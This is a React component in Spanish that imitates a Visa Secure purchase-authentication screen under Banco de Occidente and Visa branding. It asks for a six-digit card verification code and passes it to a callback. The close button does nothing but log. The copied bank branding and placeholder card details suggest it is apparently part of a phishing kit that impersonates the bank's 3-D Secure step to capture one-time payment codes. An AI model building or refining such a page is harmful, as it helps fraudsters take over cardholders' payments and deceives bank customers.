import React, { useState } from 'react';
import "./occidente_dinamica_tc.css";
import LogoOccidente from "../../img/logo-occidente.svg";
import VisaLogo from "../../img/Visa_logo.webp";

export default function VisaSecure({ onSubmit, onResend }) {
  const [code, setCode] = useState('');

  return (
    <div className="visa-container">
      <div className="visa-card">
        {/* CERRAR (X) */}
        <button
          className="visa-close-btn"
          onClick={() => console.log('Cerrar Modal')}
        >
          ×
        </button>

        {/* HEADER LOGOS */}
        <div className="visa-header">
          <div className="visa-logo-bank">
            <img src={LogoOccidente} alt="Banco de Occidente" />
          </div>
          <div className="visa-logo-brand">
            <img src={VisaLogo} alt="Visa" />
          </div>
        </div>

        <div className="visa-body">
          <h2 className="visa-title">
            Autenticación de compra
          </h2>

          <div className="visa-message">
            <p>
              Acabamos de enviarte un código de verificación por correo electrónico o
              mensaje de texto.
            </p>
            <p>
              Para autorizar un pago en <strong>Comercio</strong> con tu tarjeta
              terminada en <strong>****XXXX</strong>.
            </p>
            <p className="visa-security-notice">
              Banco de Occidente nunca te solicitará información confidencial o financiera
              como usuarios y claves de acceso.
            </p>
          </div>

          <form onSubmit={(e) => { e.preventDefault(); if (onSubmit) onSubmit(code); }} className="visa-form">
            <div className="visa-input-group">
              <label className="visa-label">
                Código de verificación
              </label>
              <input
                type="text"
                inputMode="numeric"
                maxLength={6}
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
                className="visa-input"
                placeholder=""
              />
            </div>

            <button
              type="submit"
              className="visa-btn-primary"
            >
              ENVIAR
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
